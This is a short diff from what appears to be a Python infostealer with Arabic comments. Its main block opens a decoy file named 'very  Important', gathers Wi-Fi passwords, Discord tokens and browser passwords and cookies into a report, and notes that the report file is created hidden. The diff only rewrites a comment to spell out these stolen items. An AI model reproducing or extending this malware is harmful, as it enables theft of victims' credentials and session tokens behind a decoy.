@@ -205,7 +205,7 @@ if __name__ == "__main__":
         if os.path.exists("very  Important"):
             os.startfile("very  Important")
 
-        # 4. جمع البيانات النصية بما فيها الـ Clipboard المطور
+        # 4. جمع البيانات النصية (كلمات مرور الواي فاي، التوكنات، كلمات مرور المتصفحات والكوكيز)
         final_report = get_wifi_passwords() + get_discord_tokens() + get_browser_data()
 
         # 5. إنشاء ملف التقرير مخفياً من اللحظة الأولى
